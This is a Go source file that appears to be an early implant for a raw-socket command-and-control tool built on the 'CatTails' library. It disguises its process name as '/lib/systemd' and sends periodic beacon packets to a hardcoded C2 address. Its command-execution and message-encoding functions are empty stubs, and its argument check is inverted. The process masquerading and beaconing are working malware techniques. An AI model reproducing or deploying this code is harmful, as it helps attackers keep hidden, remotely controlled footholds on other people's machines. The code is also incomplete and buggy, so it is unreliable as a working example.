package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"reflect"
	"time"
	"unsafe"

	"github.com/oneNutW0nder/CatTails/cattails"
	"golang.org/x/sys/unix"
)

var dstPort int
var srcPort int

func HideName(pname string) {
	argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]))
	argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len]

	n := copy(argv0, pname)
	if n < len(argv0) {
		for i := n; i < len(argv0); i++ {
			argv0[i] = 0
		}
	}
}

func generateHeartbeat(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr) {
	for {
		fd := cattails.NewSocket()
		defer unix.Close(fd)

		packet := cattails.CreatePacket(iface, src, dst, 18000, 1, dstMAC, cattails.CreateHello(iface.HardwareAddr, src))
		addr := cattails.CreateAddrStruct(iface)
		cattails.SendPacket(fd, iface, addr, packet)

		fmt.Println("[+] Sent HELLO")
		time.Sleep(180 * time.Second)
	}
}

func executeCmd() {

}

func encodeMsg() {

}

func decodeMsg() {

}

// Args - C2 Hostname/IP   |   dstPort
func getParams(args []string) (string, int) {
	usage := "please do it RIghT"
	if len(args) > 2 {
		fmt.Printf("Error : Not Enough Args\n%v\n", usage)
		os.Exit(0)
	}
	fmt.Printf("C2 IP : %v\n DstPort : %v", args[0], args[1])

	var dstPort int
	_, e := fmt.Sscan(args[1], &dstPort)
	if e != nil {
		fmt.Println(e)
	}
	return args[0], dstPort
}

func main() {
	// Process Arguements
	//c2addr, dstPort := getParams(os.Args)
	getParams(os.Args)

	// Hide Process Name
	HideName("/lib/systemd")

	/* Cattails Init */
	// Create BPF filter vm
	cattails.CreateBPFVM(cattails.FilterRaw)

	// Create reading socket
	readfd := cattails.NewSocket()
	defer unix.Close(readfd)
	fmt.Println("[+] Socket created")

	// Get information that is needed for networking
	iface, src := cattails.GetOutwardIface("192.168.1.174:8000")

	dstMAC, err := cattails.GetRouterMAC()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] DST MAC:", dstMAC.String())
	fmt.Println("[+] Listening")

	go generateHeartbeat(iface, src, net.IPv4(192, 168, 1, 174), dstMAC)

}
